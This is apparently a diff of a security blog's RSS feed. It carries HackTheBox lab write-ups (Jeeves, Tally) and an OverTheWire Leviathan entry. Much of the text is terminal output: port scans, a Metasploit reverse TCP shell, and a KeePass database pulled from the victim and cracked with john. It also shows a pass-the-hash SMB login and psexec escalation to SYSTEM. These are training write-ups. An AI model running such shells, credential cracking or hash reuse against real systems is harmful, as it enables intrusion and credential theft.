-40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Saved Games<br>
-40555/r-xr-xr-x 4096 dir 2017-11-04 04:16:35 +0100 Searches<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 SendTo<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Start Menu<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Templates<br>
-40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Videos<br>
-100666/rw-rw-rw- 81920 fil 2017-11-04 03:50:40 +0100 ntuser.dat.LOG1<br>
-100666/rw-rw-rw- 163840 fil 2017-11-04 03:50:40 +0100 ntuser.dat.LOG2<br>
-100666/rw-rw-rw- 20 fil 2017-11-04 03:50:40 +0100 ntuser.ini</p>
-<h1 id="listing-cuserskohsukedesktop">meterpreter &gt; cd Desktop<br>
-meterpreter &gt; ls<br>
-Listing: C:\Users\kohsuke\Desktop</h1>
-<p>Mode Size Type Last modified Name</p>
-<hr>
-<p>100666/rw-rw-rw- 282 fil 2017-11-04 04:15:51 +0100 desktop.ini<br>
-100444/r&ndash;r&ndash;r&ndash; 32 fil 2017-11-04 04:22:51 +0100 user.txt</p>
-<p>meterpreter &gt; cd ..<br>
-meterpreter &gt; cd Documents</p>
-<h1 id="listing-cuserskohsukedocuments">meterpreter &gt; ls<br>
-Listing: C:\Users\kohsuke\Documents</h1>
-<p>Mode Size Type Last modified Name</p>
-<hr>
-<p>100666/rw-rw-rw- 2846 fil 2017-09-18 19:43:17 +0200 CEH.kdbx<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Music<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Pictures<br>
-40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Videos<br>
-100666/rw-rw-rw- 402 fil 2017-11-04 04:15:51 +0100 desktop.ini</p>
-<p>meterpreter &gt; download CEH.kdbx<br>
-[<em>] Downloading: CEH.kdbx -&gt; CEH.kdbx<br>
-[</em>] Downloaded 2.78 KiB of 2.78 KiB (100.0%): CEH.kdbx -&gt; CEH.kdbx<br>
-[*] download : CEH.kdbx -&gt; CEH.kdbx</p>
-<p>root@kali:~/htb/jeeves# ls<br>
-CEH.kdbx<br>
-root@kali:~/htb/jeeves# keepass2john CEH.kdbx &gt; hash<br>
-root@kali:~/htb/jeeves# john &ndash;format=KeePass &ndash;wordlist=/usr/share/wordlists/rockyou.txt hash<br>
-Using default input encoding: UTF-8<br>
-Loaded 1 password hash (KeePass [SHA256 AES 32/64 OpenSSL])<br>
-Press &lsquo;q&rsquo; or Ctrl-C to abort, almost any other key for status<br>
-moonshine1 (CEH)<br>
-1g 0:00:00:52 DONE (2018-05-17 20:25) 0.01922g/s 1057p/s 1057c/s 1057C/s moonshine1<br>
-Use the &ldquo;&ndash;show&rdquo; option to display all of the cracked passwords reliably<br>
-Session completed<br>
-root@kali:~/htb/jeeves# keepass2 CEH.kdbx</p>
-<p><img src="https://imgur.com/sjSlTdI.jpg" alt="4jenkins"></p>
-<p>root@kali:~/htb/jeeves# smbclient.py <a href="mailto:administrator@10.10.10.63">administrator@10.10.10.63</a> -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00<br>
-Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies</p>
-<p>Type help for list of commands</p>
-<h1 id="help">help</h1>
-<p>open {host,port=445} - opens a SMB connection against the target host/port<br>
-login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it&rsquo;ll be prompted<br>
-kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it&rsquo;ll be prompted. Use the DNS resolvable domain name<br>
-login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes<br>
-logoff - logs off<br>
-shares - list available shares<br>
-use {sharename} - connect to an specific share<br>
-cd {path} - changes the current directory to {path}<br>
-lcd {path} - changes the current local directory to {path}<br>
-pwd - shows current remote directory<br>
-password - changes the user password, the new password will be prompted for input<br>
-ls {wildcard} - lists all the files in the current directory<br>
-rm {file} - removes the selected file<br>
-mkdir {dirname} - creates the directory under the current path<br>
-rmdir {dirname} - removes the directory under the current path<br>
-put {filename} - uploads the filename into the current path<br>
-get {filename} - downloads the filename from the current path<br>
-info - returns NetrServerInfo main results<br>
-who - returns the sessions currently connected at the target host (admin required)<br>
-close - closes the current SMB Session<br>
-exit - terminates the server process (and this session)</p>
-<h1 id="who">who</h1>
-<p>host: \10.10.14.229, user: ADMINISTRATOR, active: 30, idle: 26<br>
-host: \10.10.14.229, user: ADMINISTRATOR, active: 28, idle: 28<br>
-host: \10.10.14.206, user: administrator, active: 21, idle: 0</p>
-<h1 id="password">password</h1>
-<p>New Password:</p>
-<p>msf &gt; use exploit/windows/smb/psexec<br>
-msf exploit(windows/smb/psexec) &gt; show options</p>
-<p>Module options (exploit/windows/smb/psexec):</p>
-<p>Name Current Setting Required Description</p>
-<hr>
-<p>RHOST yes The target address<br>
-RPORT 445 yes The SMB service port (TCP)<br>
-SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing<br>
-SERVICE_DISPLAY_NAME no The service display name<br>
-SERVICE_NAME no The service name<br>
-SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,&hellip;) or a normal read/write folder share<br>
-SMBDomain . no The Windows domain to use for authentication<br>
-SMBPass no The password for the specified username<br>
-SMBUser no The username to authenticate as</p>
-<p>Exploit target:</p>
-<p>Id Name</p>
-<hr>
-<p>0 Automatic</p>
-<p>msf exploit(windows/smb/psexec) &gt; set RHOST 10.10.10.63<br>
-RHOST =&gt; 10.10.10.63<br>
-msf exploit(windows/smb/psexec) &gt; set smbpass 123456<br>
-smbpass =&gt; 123456<br>
-msf exploit(windows/smb/psexec) &gt; set smbuser administrator<br>
-smbuser =&gt; administrator<br>
-msf exploit(windows/smb/psexec) &gt; exploit</p>
-<p>[<em>] Started reverse TCP handler on 10.10.14.206:4444<br>
-[</em>] 10.10.10.63:445 - Connecting to the server&hellip;<br>
-[<em>] 10.10.10.63:445 - Authenticating to 10.10.10.63:445 as user &lsquo;administrator&rsquo;&hellip;<br>
-[</em>] 10.10.10.63:445 - Selecting PowerShell target<br>
-[<em>] 10.10.10.63:445 - Executing the payload&hellip;<br>
-[+] 10.10.10.63:445 - Service start timed out, OK if running a command or non-service executable&hellip;<br>
-[</em>] Sending stage (179779 bytes) to 10.10.10.63<br>
-[*] Meterpreter session 1 opened (10.10.14.206:4444 -&gt; 10.10.10.63:49672) at 2018-05-17 21:14:07 +0200</p>
-<h1 id="listing-cusersadministratordesktop">meterpreter &gt; getuid<br>
-Server username: NT AUTHORITY\SYSTEM<br>
-meterpreter &gt; cd C:/Users/Administrator/Desktop<br>
-meterpreter &gt; ls<br>
-[-] Unknown command: ls.<br>
-meterpreter &gt; ls<br>
-Listing: C:\Users\Administrator\Desktop</h1>
-<p>Mode Size Type Last modified Name</p>
-<hr>
-<p>100666/rw-rw-rw- 797 fil 2017-11-08 15:05:18 +0100 Windows 10 Update Assistant.lnk<br>
-100666/rw-rw-rw- 282 fil 2017-11-04 03:03:17 +0100 desktop.ini<br>
-100444/r&ndash;r&ndash;r&ndash; 36 fil 2017-12-24 08:51:10 +0100 hm.txt</p>
-<p>meterpreter &gt; cat hm.txt<br>
-The flag is elsewhere. Look deeper.</p>
-<p>C:\Users\Administrator\Desktop&gt;more &lt; hm.txt:root.txt<br>
-more &lt; hm.txt:root.txt<br>
-afbc5bd4b615a60648cec41c6ac92530</p>
-]]></content>
-        </item>
-        
-        <item>
             <title>HackTheBox Tally</title>
-            <link>https://www.m10x.de/posts/2010/01/hackthebox-tally/</link>
+            <link>/posts/2010/01/hackthebox-tally/</link>
             <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2010/01/hackthebox-tally/</guid>
+            <guid>/posts/2010/01/hackthebox-tally/</guid>
             <description>root@kali:~# nmap -A 10.10.10.59
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-14 18:55 EDT
 Nmap scan report for 10.10.10.59
@@ -5821,6 +6869,314 @@ meterpreter &gt; getuid<br>
 Server username: NT AUTHORITY\SYSTEM</p>
 <p>meterpreter &gt; cat C:\Users\Administrator\Desktop\root.txt<br>
 608#########################3eda</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>OverTheWire - Leviathan</title>
+            <link>/posts/2010/01/overthewire-leviathan/</link>
+            <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
+            
+            <guid>/posts/2010/01/overthewire-leviathan/</guid>
+            <description>Level 0
+root@kali:~# ssh leviathan.labs.overthewire.org -p 2223 -l leviathan0
+[&amp;hellip;]
+leviathan0@leviathan:~$ ls
+leviathan0@leviathan:~$ ls -alh
+total 24K
+drwxr-xr-x 3 root root 4.0K Oct 29 2018 .
+drwxr-xr-x 10 root root 4.0K Oct 29 2018 ..
+drwxr-x&amp;mdash; 2 leviathan1 leviathan0 4.0K Oct 29 2018 .backup
+-rw-r&amp;ndash;r&amp;ndash; 1 root root 220 May 15 2017 .bash_logout
+-rw-r&amp;ndash;r&amp;ndash; 1 root root 3.5K May 15 2017 .bashrc
+-rw-r&amp;ndash;r&amp;ndash; 1 root root 675 May 15 2017 .</description>
+            <content type="html"><![CDATA[<p>Level 0</p>
+<p>root@kali:~# ssh leviathan.labs.overthewire.org -p 2223 -l leviathan0<br>
+[&hellip;]</p>
+<p>leviathan0@leviathan:~$ ls<br>
+leviathan0@leviathan:~$ ls -alh<br>
+total 24K<br>
+drwxr-xr-x 3 root root 4.0K Oct 29 2018 .<br>
+drwxr-xr-x 10 root root 4.0K Oct 29 2018 ..<br>
+drwxr-x&mdash; 2 leviathan1 leviathan0 4.0K Oct 29 2018 .backup<br>
+-rw-r&ndash;r&ndash; 1 root root 220 May 15 2017 .bash_logout<br>
+-rw-r&ndash;r&ndash; 1 root root 3.5K May 15 2017 .bashrc<br>
+-rw-r&ndash;r&ndash; 1 root root 675 May 15 2017 .profile<br>
+leviathan0@leviathan:~$ cat .backup<br>
+cat: .backup: Is a directory<br>
+leviathan0@leviathan:~$ cd .backup/<br>
+leviathan0@leviathan:~/.backup$ ls<br>
+bookmarks.html<br>
+leviathan0@leviathan:~/.backup$ ls -alh<br>
+total 140K<br>
+drwxr-x&mdash; 2 leviathan1 leviathan0 4.0K Oct 29 2018 .<br>
+drwxr-xr-x 3 root root 4.0K Oct 29 2018 ..<br>
+-rw-r&mdash;&ndash; 1 leviathan1 leviathan0 131K Oct 29 2018 bookmarks.html<br>
+leviathan0@leviathan:~/.backup$ cat bookmarks.html | grep pass</p>
+<!-- raw HTML omitted -->
+<p>Level 0 zu Level 1</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>HackTheBox Jeeves</title>
+            <link>/posts/1/01/hackthebox-jeeves/</link>
+            <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+            
+            <guid>/posts/1/01/hackthebox-jeeves/</guid>
+            <description>root@kali:~/htb/jeeves# nmap -p- 10.10.10.63 [19/19]
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-17 19:02 CEST
+Nmap scan report for 10.10.10.63
+Host is up (0.078s latency).
+Not shown: 65531 filtered ports
+PORT STATE SERVICE
+80/tcp open http
+135/tcp open msrpc
+445/tcp open microsoft-ds
+50000/tcp open ibm-db2
+Nmap done: 1 IP address (1 host up) scanned in 372.85 seconds
+root@kali:~/htb/jeeves# nmap -p80,135,445,50000 -A 10.10.10.63
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-17 19:10 CEST</description>
+            <content type="html"><![CDATA[<p><a href="http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE"><img src="http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
+<p><img src="https://imgur.com/lZBhQ23.jpg" alt="5jenkins"></p>
+<p>root@kali:~/htb/jeeves# nmap -p- 10.10.10.63 [19/19]<br>
+Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2018-05-17 19:02 CEST<br>
+Nmap scan report for 10.10.10.63<br>
+Host is up (0.078s latency).<br>
+Not shown: 65531 filtered ports<br>
+PORT STATE SERVICE<br>
+80/tcp open http<br>
+135/tcp open msrpc<br>
+445/tcp open microsoft-ds<br>
+50000/tcp open ibm-db2</p>
+<p>Nmap done: 1 IP address (1 host up) scanned in 372.85 seconds<br>
+root@kali:~/htb/jeeves# nmap -p80,135,445,50000 -A 10.10.10.63<br>
+Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2018-05-17 19:10 CEST<br>
+Nmap scan report for 10.10.10.63<br>
+Host is up (0.11s latency).</p>
+<p>PORT STATE SERVICE VERSION<br>
+80/tcp filtered http<br>
+135/tcp open msrpc Microsoft Windows RPC<br>
+445/tcp filtered microsoft-ds<br>
+50000/tcp open http Jetty 9.4.z-SNAPSHOT<br>
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)<br>
+|_http-title: Error 404 Not Found<br>
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>
+Device type: general purpose<br>
+Running (JUST GUESSING): Microsoft Windows 2008 (89%), FreeBSD 6.X (85%)<br>
+OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:freebsd:freebsd:6.2<br>
+Aggressive OS guesses: Microsoft Windows Server 2008 R2 (89%), FreeBSD 6.2-RELEASE (85%)<br>
+No exact OS matches for host (test conditions non-ideal).<br>
+Network Distance: 2 hops<br>
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>
+<p>TRACEROUTE (using port 135/tcp)<br>
+HOP RTT ADDRESS<br>
+1 65.52 ms 10.10.14.1<br>
+2 273.84 ms 10.10.10.63</p>
+<p>OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>
+Nmap done: 1 IP address (1 host up) scanned in 20.89 seconds</p>
+<p>root@kali:~/htb/jeeves# gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50 -u http://10.10.10.63:50000</p>
+<h1 id="gobuster-v141-oj-reeves-thecolonial">Gobuster v1.4.1 OJ Reeves (@TheColonial)</h1>
+<h1 id="-status-codes--200204301302307">=====================================================<br>
+[+] Mode : dir<br>
+[+] Url/Domain : http://10.10.10.63:50000/<br>
+[+] Threads : 50<br>
+[+] Wordlist : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt<br>
+[+] Status codes : 200,204,301,302,307</h1>
+<p>/askjeeves (Status: 302)</p>
+<p><img src="https://imgur.com/SEgHp6t.jpg" alt="1jenkins"></p>
+<p><img src="https://imgur.com/NRLrVP3.jpg" alt="2jenkins"></p>
+<p><img src="https://imgur.com/JFZAihz.jpg" alt="3jenkins"></p>
+<p>msf &gt; use exploit/multi/handler<br>
+msf exploit(multi/handler) &gt; set lhost 10.10.14.206<br>
+lhost =&gt; 10.10.14.206<br>
+msf exploit(multi/handler) &gt; set lport 44544<br>
+lport =&gt; 44544<br>
+msf exploit(multi/handler) &gt; set payload windows/x64/shell/reverse_tcp<br>
+payload =&gt; windows/x64/shell/reverse_tcp<br>
+msf exploit(multi/handler) &gt; clear<br>
+[*] exec: clear</p>
+<p>msf exploit(multi/handler) &gt; exploit</p>
+<p>[<em>] Started reverse TCP handler on 10.10.14.206:44544<br>
+[</em>] Sending stage (336 bytes) to 10.10.10.63<br>
+[*] Command shell session 5 opened (10.10.14.206:44544 -&gt; 10.10.10.63:49694) at 2018-05-17 20:21:01 +0200</p>
+<p>Microsoft Windows [Version 10.0.10586]<br>
+(c) 2015 Microsoft Corporation. All rights reserved.</p>
+<p>C:\Users\Administrator.jenkins&gt;More?<br>
+More?</p>
+<p>&lsquo;PuGroj&rsquo; is not recognized as an internal or external command,<br>
+operable program or batch file.</p>
+<p>C:\Users\Administrator.jenkins&gt;^Z<br>
+Background session 5? [y/N] y<br>
+msf exploit(multi/handler) &gt; sessions -u 5<br>
+[*] Executing &lsquo;post/multi/manage/shell_to_meterpreter&rsquo; on session(s): [5]</p>
+<p>[<em>] Upgrading session ID: 5<br>
+[</em>] Starting exploit/multi/handler<br>
+[<em>] Started reverse TCP handler on 10.10.14.206:4433<br>
+#&lt;Thread:0x000056306eca6008@/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:93 run&gt; terminated with exception (report_on_exception is true):<br>
+Traceback (most recent call last):<br>
+1: from /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb💯in <code>block in spawn'   /usr/share/metasploit-framework/modules/post/multi/manage/shell_to_meterpreter.rb:268:in </code>block in cleanup_handler': uninitialized constant Msf::Modules::Mod706f73742f6d756c74692f6d616e6167652f7368656c6c5f746f5f<br>
+6d65746572707265746572::MetasploitModule::HANDLE_TIMEOUT (NameError)<br>
+msf exploit(multi/handler) &gt;<br>
+[</em>] Sending stage (179779 bytes) to 10.10.10.63<br>
+[<em>] Meterpreter session 6 opened (10.10.14.206:4433 -&gt; 10.10.10.63:49695) at 2018-05-17 20:21:31 +0200<br>
+Interrupt: use the &lsquo;exit&rsquo; command to quit<br>
+msf exploit(multi/handler) &gt; sessions -i 6<br>
+[</em>] Starting interaction with 6&hellip;</p>
+<p>meterpreter &gt; getuid<br>
+Server username: JEEVES\kohsuke</p>
+<h1 id="listing-cuserskohsuke">meterpreter &gt; cd C:/Users/kohsuke<br>
+meterpreter &gt; ls<br>
+Listing: C:\Users\kohsuke</h1>
+<p>Mode Size Type Last modified Name</p>
+<hr>
+<p>40777/rwxrwxrwx 0 dir 2017-11-04 03:51:45 +0100 .groovy<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 AppData<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Application Data<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Contacts<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Cookies<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 04:19:59 +0100 Desktop<br>
+40555/r-xr-xr-x 4096 dir 2017-11-04 04:18:57 +0100 Documents<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Downloads<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Favorites<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 04:22:42 +0100 Links<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Local Settings<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Music<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Documents<br>
+100666/rw-rw-rw- 786432 fil 2017-12-24 20:38:40 +0100 NTUSER.DAT<br>
+100666/rw-rw-rw- 65536 fil 2017-11-04 03:50:41 +0100 NTUSER.DAT{62e13464-7ee5-11e5-80c4-a4badb40df56}.TM.blf<br>
+100666/rw-rw-rw- 524288 fil 2017-11-04 03:50:41 +0100 NTUSER.DAT{62e13464-7ee5-11e5-80c4-a4badb40df56}.TMContainer00000000000000000001.regtrans-ms<br>
+100666/rw-rw-rw- 524288 fil 2017-11-04 03:50:41 +0100 NTUSER.DAT{62e13464-7ee5-11e5-80c4-a4badb40df56}.TMContainer00000000000000000002.regtrans-ms<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 NetHood<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 04:22:42 +0100 OneDrive<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 08:10:02 +0100 Pictures<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 PrintHood<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Recent<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Saved Games<br>
+40555/r-xr-xr-x 4096 dir 2017-11-04 04:16:35 +0100 Searches<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 SendTo<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Start Menu<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 Templates<br>
+40555/r-xr-xr-x 0 dir 2017-11-04 04:15:51 +0100 Videos<br>
+100666/rw-rw-rw- 81920 fil 2017-11-04 03:50:40 +0100 ntuser.dat.LOG1<br>
+100666/rw-rw-rw- 163840 fil 2017-11-04 03:50:40 +0100 ntuser.dat.LOG2<br>
+100666/rw-rw-rw- 20 fil 2017-11-04 03:50:40 +0100 ntuser.ini</p>
+<h1 id="listing-cuserskohsukedesktop">meterpreter &gt; cd Desktop<br>
+meterpreter &gt; ls<br>
+Listing: C:\Users\kohsuke\Desktop</h1>
+<p>Mode Size Type Last modified Name</p>
+<hr>
+<p>100666/rw-rw-rw- 282 fil 2017-11-04 04:15:51 +0100 desktop.ini<br>
+100444/r&ndash;r&ndash;r&ndash; 32 fil 2017-11-04 04:22:51 +0100 user.txt</p>
+<p>meterpreter &gt; cd ..<br>
+meterpreter &gt; cd Documents</p>
+<h1 id="listing-cuserskohsukedocuments">meterpreter &gt; ls<br>
+Listing: C:\Users\kohsuke\Documents</h1>
+<p>Mode Size Type Last modified Name</p>
+<hr>
+<p>100666/rw-rw-rw- 2846 fil 2017-09-18 19:43:17 +0200 CEH.kdbx<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Music<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Pictures<br>
+40777/rwxrwxrwx 0 dir 2017-11-04 03:50:40 +0100 My Videos<br>
+100666/rw-rw-rw- 402 fil 2017-11-04 04:15:51 +0100 desktop.ini</p>
+<p>meterpreter &gt; download CEH.kdbx<br>
+[<em>] Downloading: CEH.kdbx -&gt; CEH.kdbx<br>
+[</em>] Downloaded 2.78 KiB of 2.78 KiB (100.0%): CEH.kdbx -&gt; CEH.kdbx<br>
+[*] download : CEH.kdbx -&gt; CEH.kdbx</p>
+<p>root@kali:~/htb/jeeves# ls<br>
+CEH.kdbx<br>
+root@kali:~/htb/jeeves# keepass2john CEH.kdbx &gt; hash<br>
+root@kali:~/htb/jeeves# john &ndash;format=KeePass &ndash;wordlist=/usr/share/wordlists/rockyou.txt hash<br>
+Using default input encoding: UTF-8<br>
+Loaded 1 password hash (KeePass [SHA256 AES 32/64 OpenSSL])<br>
+Press &lsquo;q&rsquo; or Ctrl-C to abort, almost any other key for status<br>
+moonshine1 (CEH)<br>
+1g 0:00:00:52 DONE (2018-05-17 20:25) 0.01922g/s 1057p/s 1057c/s 1057C/s moonshine1<br>
+Use the &ldquo;&ndash;show&rdquo; option to display all of the cracked passwords reliably<br>
+Session completed<br>
+root@kali:~/htb/jeeves# keepass2 CEH.kdbx</p>
+<p><img src="https://imgur.com/sjSlTdI.jpg" alt="4jenkins"></p>
+<p>root@kali:~/htb/jeeves# smbclient.py <a href="mailto:administrator@10.10.10.63">administrator@10.10.10.63</a> -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00<br>
+Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies</p>
+<p>Type help for list of commands</p>
+<h1 id="help">help</h1>
+<p>open {host,port=445} - opens a SMB connection against the target host/port<br>
+login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it&rsquo;ll be prompted<br>
+kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it&rsquo;ll be prompted. Use the DNS resolvable domain name<br>
+login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes<br>
+logoff - logs off<br>
+shares - list available shares<br>
+use {sharename} - connect to an specific share<br>
+cd {path} - changes the current directory to {path}<br>
+lcd {path} - changes the current local directory to {path}<br>
+pwd - shows current remote directory<br>
+password - changes the user password, the new password will be prompted for input<br>
+ls {wildcard} - lists all the files in the current directory<br>
+rm {file} - removes the selected file<br>
+mkdir {dirname} - creates the directory under the current path<br>
+rmdir {dirname} - removes the directory under the current path<br>
+put {filename} - uploads the filename into the current path<br>
+get {filename} - downloads the filename from the current path<br>
+info - returns NetrServerInfo main results<br>
+who - returns the sessions currently connected at the target host (admin required)<br>
+close - closes the current SMB Session<br>
+exit - terminates the server process (and this session)</p>
+<h1 id="who">who</h1>
+<p>host: \10.10.14.229, user: ADMINISTRATOR, active: 30, idle: 26<br>
+host: \10.10.14.229, user: ADMINISTRATOR, active: 28, idle: 28<br>
+host: \10.10.14.206, user: administrator, active: 21, idle: 0</p>
+<h1 id="password">password</h1>
+<p>New Password:</p>
+<p>msf &gt; use exploit/windows/smb/psexec<br>
+msf exploit(windows/smb/psexec) &gt; show options</p>
+<p>Module options (exploit/windows/smb/psexec):</p>
+<p>Name Current Setting Required Description</p>
+<hr>
+<p>RHOST yes The target address<br>
+RPORT 445 yes The SMB service port (TCP)<br>
+SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing<br>
+SERVICE_DISPLAY_NAME no The service display name<br>
+SERVICE_NAME no The service name<br>
+SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,&hellip;) or a normal read/write folder share<br>
+SMBDomain . no The Windows domain to use for authentication<br>
+SMBPass no The password for the specified username<br>
+SMBUser no The username to authenticate as</p>
+<p>Exploit target:</p>
+<p>Id Name</p>
+<hr>
+<p>0 Automatic</p>
+<p>msf exploit(windows/smb/psexec) &gt; set RHOST 10.10.10.63<br>
+RHOST =&gt; 10.10.10.63<br>
+msf exploit(windows/smb/psexec) &gt; set smbpass 123456<br>
+smbpass =&gt; 123456<br>
+msf exploit(windows/smb/psexec) &gt; set smbuser administrator<br>
+smbuser =&gt; administrator<br>
+msf exploit(windows/smb/psexec) &gt; exploit</p>
+<p>[<em>] Started reverse TCP handler on 10.10.14.206:4444<br>
+[</em>] 10.10.10.63:445 - Connecting to the server&hellip;<br>
+[<em>] 10.10.10.63:445 - Authenticating to 10.10.10.63:445 as user &lsquo;administrator&rsquo;&hellip;<br>
+[</em>] 10.10.10.63:445 - Selecting PowerShell target<br>
+[<em>] 10.10.10.63:445 - Executing the payload&hellip;<br>
+[+] 10.10.10.63:445 - Service start timed out, OK if running a command or non-service executable&hellip;<br>
+[</em>] Sending stage (179779 bytes) to 10.10.10.63<br>
+[*] Meterpreter session 1 opened (10.10.14.206:4444 -&gt; 10.10.10.63:49672) at 2018-05-17 21:14:07 +0200</p>
+<h1 id="listing-cusersadministratordesktop">meterpreter &gt; getuid<br>
+Server username: NT AUTHORITY\SYSTEM<br>
+meterpreter &gt; cd C:/Users/Administrator/Desktop<br>
+meterpreter &gt; ls<br>
+[-] Unknown command: ls.<br>
+meterpreter &gt; ls<br>
+Listing: C:\Users\Administrator\Desktop</h1>
+<p>Mode Size Type Last modified Name</p>
+<hr>
+<p>100666/rw-rw-rw- 797 fil 2017-11-08 15:05:18 +0100 Windows 10 Update Assistant.lnk<br>
+100666/rw-rw-rw- 282 fil 2017-11-04 03:03:17 +0100 desktop.ini<br>
+100444/r&ndash;r&ndash;r&ndash; 36 fil 2017-12-24 08:51:10 +0100 hm.txt</p>
+<p>meterpreter &gt; cat hm.txt<br>
+The flag is elsewhere. Look deeper.</p>
+<p>C:\Users\Administrator\Desktop&gt;more &lt; hm.txt:root.txt<br>
+more &lt; hm.txt:root.txt<br>
+afbc5bd4b615a60648cec41c6ac92530</p>
 ]]></content>
         </item>
         
